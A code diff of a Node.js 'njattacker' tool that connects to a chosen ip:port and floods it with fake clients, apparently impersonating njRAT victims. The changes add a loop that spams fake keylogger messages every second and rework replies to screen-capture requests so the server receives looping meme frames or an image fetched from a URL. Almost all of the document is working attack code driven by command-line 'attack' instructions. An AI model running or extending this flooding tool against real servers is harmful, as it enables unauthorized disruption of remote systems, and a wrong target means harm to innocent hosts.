@@ -1,13 +1,13 @@
 const log = require('./log.js');
-if (process.argv.length < 6 || process.argv.length > 7) {
-  log.info("Can't attack please make sure to execute: node app.js ip:port count delay mode ex node app.js 192.233.122.21:1177 100 15 config, mode could be either config or random, count could be infinite string.");
-  process.exit(0);
-}
-
 var net = require('net');
 var fs = require('fs');
 const btoa = require('btoa');
 const https = require('https');
+
+if (process.argv.length < 7 || process.argv.length > 8) {
+  log.info("Can't attack please make sure to execute: node app.js ip:port count delay mode ex node app.js 192.233.122.21:1177 100 15 config ricardao true, mode could be either config or random, count could be infinite string. CAP can be ricardao for the ricardo milos dance, or an URL, klspam can be true or false spams keylogger with windows.");
+  process.exit(0);
+}
 
 var config = require('./config.json');
 var rndconfig = require('./config_random.json');
@@ -115,6 +115,17 @@ function createFakeClient() {
         btoa('fodase')
       ]
     }))
+    if (process.argv[7] === 'true') {
+      log.info("Opening Keylogger window.")
+      setInterval(() => {
+        socket.write(formatCMD({
+          name: 'kl',
+          params: [
+            btoa(choose(rndconfig.names))
+          ]
+        }))
+      }, 1000);
+    }
     log.info(`(${i}) sending fake client on ${ip}:${port} mode ${process.argv[5]}`);
   });
 
@@ -122,6 +133,10 @@ function createFakeClient() {
     log.error("Connection was Closed Unexpectedly or was closed already, closing spammer. (GOT EM)", "njattacker", error);
     process.exit(0);
   });
+
+  socket.on('close', () => {
+    log.info(`socket closed unexpectedely (maybe client disconnected server?)`);
+  })
 
   socket.on('data', (data) => {
     const dataS = data.toString();
@@ -132,52 +147,43 @@ function createFakeClient() {
 
     const msg = dataS.split('\x00')[1];
     const command = msg.split("|'|'|")[0];
-    const args = msg.split("|'|'|").shift();
+    const args = msg.split("|'|'|");
+    args.shift();
+
     if (!command || !args) return;
-    log.debug(command, args, "recieved")
 
-    // Keylogger
-    if (command === 'kl') {
-      setInterval(() => {
-        socket.write(formatCMD({
-          name: 'kl',
-          params: [
-            btoa(choose(rndconfig.names))
-          ]
-        }))
-      }, 1000)
-    }
-
-    // Screen Cap (in table)
-    if (command === 'CAP') {
-      if (process.argv[6] && process.argv[6] === "ricardao") {
-        const images = fs.readdirSync('frames').map(name => fs.readFileSync(`frames/${name}`))
-        let iimg = 0
-        setInterval(() => {
-          const command = Buffer.from(`CAP|'|'|`, 'utf8')
-          const image = images[iimg]
-          const complete = Buffer.concat([command, image])
-          const start = Buffer.from(`${complete.length}\x00`, 'utf8')
-          socket.write(Buffer.concat([start, complete]))
-          if (iimg < images.length - 1) {
-            iimg++
-          } else {
-            iimg = 0
-          }
-        }, 100)
-      } else if (validateUrl(process.argv[6])) {
-        getImage(process.argv[6], function (err, data) {
-          if (err) {
-            log.error("idk", "njattacker", err);
-          }
-          return socket.write(formatCMD({
-            name: 'CAP',
-            file: data
-          }))
-        })
-      } else {
-        log.error("Couldn't validate URL for custom image", "njattacker", "none"); process.exit(0);
-      }
+    log.debug(`Recieved ${args} complete message ${msg}`, command);
+    switch (command) {
+      case 'CAP':
+        if (process.argv[6] && process.argv[6] === "ricardao") {
+          const images = fs.readdirSync('frames').map(name => fs.readFileSync(`frames/${name}`))
+          let iimg = 0
+          setInterval(() => {
+            const image = images[iimg];
+            socket.write(formatCMD({
+              name: 'CAP',
+              file: image
+            }));
+            if (iimg < images.length - 1) {
+              iimg++;
+            } else {
+              iimg = 0;
+            }
+          }, 100);
+        } else if (validateUrl(process.argv[6])) {
+          getImage(process.argv[6], function (err, data) {
+            if (err) {
+              log.error("idk", "njattacker", err);
+            }
+            return socket.write(formatCMD({
+              name: 'CAP',
+              file: data
+            }))
+          })
+        } else {
+          log.error("Couldn't validate URL for custom image", "njattacker", "none"); process.exit(0);
+        }
+        break;
     }
   })
 }
